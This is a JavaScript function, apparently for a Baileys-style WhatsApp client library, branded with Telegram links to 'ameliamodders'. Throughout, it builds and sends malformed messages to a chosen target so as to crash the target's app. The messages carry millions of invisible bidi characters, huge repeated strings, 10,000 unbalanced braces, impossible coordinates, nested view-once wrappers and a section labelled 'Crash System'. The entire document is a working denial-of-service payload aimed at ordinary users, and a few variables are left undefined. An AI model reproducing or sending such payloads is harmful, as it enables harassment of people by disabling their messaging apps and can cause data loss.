async function DefJam(target) {
  const Neptune = "\u202E\u2066\u200F".repeat(999999);
  const encoded = Buffer.from(Neptune).toString("base64");
  const ngontol = "𑇂𑆵𑆴𑆿".repeat(50000);

  try {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: { businessOwnerJid: target },
            },
            body: { text: "ৣৢ" + "ꦾ".repeat(90000) },
            footer: { text: "\u0000".repeat(21) },
            nativeFlowMessage: {
              buttons: Array(20).fill().map(() => ({
                name: "cta_reply",
                buttonParamsJson: "{}",
              })),
            },
          },
        },
      },
    }, { participant: { jid: target } });

    await sock.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "\n",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999,
                name: "ameliamodders",
                address: "\n",
              },
            },
            body: { text: "\n" },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    }, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });

    let loc = {
      degreesLatitude: 11.11,
      degreesLongitude: -11.11,
      name: "t.me/ameliamodders" + ngontol,
      url: "https://t.me/ameliamodders",
    };

    let locMsg = generateWAMessageFromContent(target, {
      viewOnceMessage: { message: { locationMessage: loc } }
    }, {});

    let extMsg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          extendedTextMessage: {
            text: "⟅🩸𝗣𝗵𝗼𝗲𝗻𝗶𝘅 炎 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀⟅ ༑ ▾" + ngontol,
            matchedText: "⟅ ༑ ▾𝗣𝗵𝗼𝗲𝗻𝗶𝘅 炎 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀⟅ ༑ ▾",
            description: alipngewe,
            title: "⟅🩸𝗣𝗵𝗼𝗲𝗻𝗶𝘅 炎 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀⟅ ༑ ▾" + ngontol,
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/xxx",
            thumbnailSha256: "xxx",
            thumbnailEncSha256: "xxx",
            mediaKey: "xxx",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
          }
        }
      }
    }, {});

    await sock.relayMessage('status@broadcast', locMsg.message, {
      messageId: locMsg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{ tag: 'to', attrs: { jid: target } }]
        }]
      }]
    });

    await sock.relayMessage('status@broadcast', extMsg.message, {
      messageId: extMsg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{ tag: 'to', attrs: { jid: target } }]
        }]
      }]
    });

    const fcMsg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          viewOnceMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  documentMessage: {
                    title: Neptune,
                    fileName: Neptune + ".sys.apk.exe.7z",
                    mimetype: "application/x-binary",
                    fileLength: "9999999999",
                    mediaKey: Neptune,
                    fileSha256: encoded,
                    mediaKeyTimestamp: "999999999",
                  },
                  interactiveMessage: {
                    contextInfo: {
                      mentionedJid: [target],
                      remoteJid: "status@broadcast",
                      externalAdReply: {
                        title: "🩸𝗣𝗵𝗼𝗲𝗻𝗶𝘅 炎 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀",
                        body: Neptune.slice(0, 50),
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        showAdAttribution: true,
                        sourceUrl: "https://t.me/ameliamodders",
                      },
                      quotedMessage: {
                        listResponseMessage: {
                          title: Neptune.slice(0, 20),
                          buttonText: Neptune.slice(0, 15),
                          sections: [
                            {
                              title: "Crash System",
                              rows: Array(5).fill({
                                title: heavy.slice(0, 15),
                                rowId: Neptune,
                                description: Neptune.slice(0, 25),
                              }),
                            },
                          ],
                        },
                      },
                    },
                    body: { text: Neptune.slice(0, 300) },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            crash: true,
                            key: encoded,
                            version: "@godmode",
                            note: Neptune,
                          }) + Neptune,
                        },
                        {
                          name: "call_permission_request",
                          buttonParamsJson: Neptune + Neptune,
                        },
                        {
                          name: "single_select",
                          buttonParamsJson: "🩸" + Neptune,
                        },
                      ],
                    },
                  },
                  reactionMessage: {
                    text: Neptune,
                    key: {
                      remoteJid: target,
                      fromMe: false,
                      id: Neptune,
                    },
                  },
                },
              },
            },
          },
        },
      },
    }, {});

    await sock.relayMessage(target, fcMsg.message, {
      messageId: fcMsg.key.id,
    });

    console.log("[ DefJam Send To]:", target);
  } catch (err) {
    console.error("❌ Error in Function DefJam:", err);
  }
}